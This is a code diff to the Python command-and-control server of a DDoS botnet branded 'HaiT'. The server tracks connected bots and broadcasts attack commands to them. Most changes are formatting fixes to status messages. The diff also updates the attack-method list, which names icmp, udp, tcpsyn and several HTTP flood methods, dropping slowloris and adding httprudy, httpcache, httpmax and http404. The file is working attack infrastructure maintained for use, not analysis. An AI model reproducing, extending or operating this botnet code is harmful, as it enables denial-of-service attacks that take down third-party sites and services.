@@ -64,7 +64,7 @@ def handle_client(client_socket, client_address):
     client_id = f"{client_address[0]}:{client_address[1]}"
     with clients_lock:
         clients[client_id] = client_socket
-        broadcast_to_control(f"{GREEN}[+] Bot connected: {client_address} | Total: {len(clients)}{RESET}")
+        broadcast_to_control(f"{GREEN}[+] Bot connected: {client_address} | Total: {len(clients)}{RESET}\r\n")
     try:
         client_socket.settimeout(15.0)
         while True:
@@ -82,14 +82,14 @@ def handle_client(client_socket, client_address):
         with clients_lock:
             if client_id in clients:
                 del clients[client_id]
-        broadcast_to_control(f"{RED}[-] Bot disconnected: {client_address} | Total: {len(clients)}{RESET}")
+        broadcast_to_control(f"{RED}[-] Bot disconnected: {client_address} | Total: {len(clients)}{RESET}\r\n")
     finally:
         client_socket.close()
 def broadcast_to_control(message):
     with control_lock:
         for client in control_clients[:]:
             try:
-                client.send(f"{message}\r\n".encode('utf-8'))
+                client.send(f"\r\n{message}".encode('utf-8'))
             except:
                 control_clients.remove(client)
 def broadcast_command(command):
@@ -109,13 +109,13 @@ def broadcast_command(command):
         start_time = time.time()
         while time.time() - start_time < 5:
             time.sleep(0.1)
-        broadcast_to_control(f"{GREEN}[+] Sent attack to {confirmation_count}/{total_bots} bots{RESET}")
+        broadcast_to_control(f"{GREEN}[+] Sent attack to {confirmation_count}/{total_bots} bots{RESET}\r\n")
 def show_help():
     return f"{MAGENTA}{BOLD}╔════════════════════════════╗\r\n" \
            f"║            HaiT            ║\r\n" \
            f"║        t.me/hiahihn        ║\r\n" \
            f"╚════════════════════════════╝{RESET}\r\n" \
-           f"{CYAN}Methods:{RESET} {WHITE}icmp, udp, tcpsyn, tcp, httpflood, httpstorm, httpcfb, httpio, httpspoof, slowloris{RESET}\r\n" \
+           f"{CYAN}Methods:{RESET} {WHITE}icmp, udp, tcpsyn, tcp, httpflood, httpstorm, httpcfb, httpio, httpspoof, httprudy, httpcache, httpmax, http404{RESET}\r\n" \
            f"{CYAN}Syntax:{RESET}  {WHITE}<method> <target> <port> <time> <threads>{RESET}\r\n" \
            f"{BLUE}Commands:{RESET}\r\n" \
            f"  {GREEN}cls{RESET}    - {YELLOW}Clear the screen{RESET}\r\n" \
@@ -161,7 +161,7 @@ def handle_control_client(control_socket, address):
                   f"╚═══════════════════════════════════════════════════════════════════╝{RESET}\r\n" \
                   f"{YELLOW}Type 'help' for commands{RESET}\r\n"
     control_socket.send(welcome_msg.encode('utf-8'))
-    attack_methods = {"icmp", "udp", "tcpsyn", "tcp", "httpflood", "httpstorm", "httpcfb", "httpio", "httpspoof", "slowloris"}
+    attack_methods = {"icmp", "udp", "tcpsyn", "tcp", "httpflood", "httpstorm", "httpcfb", "httpio", "httpspoof", "httprudy", "httpcache", "httpmax", "http404"}
     try:
         while True:
             prompt = f"{MAGENTA}[{RESET}{username}@hait{MAGENTA}]{RESET} > "
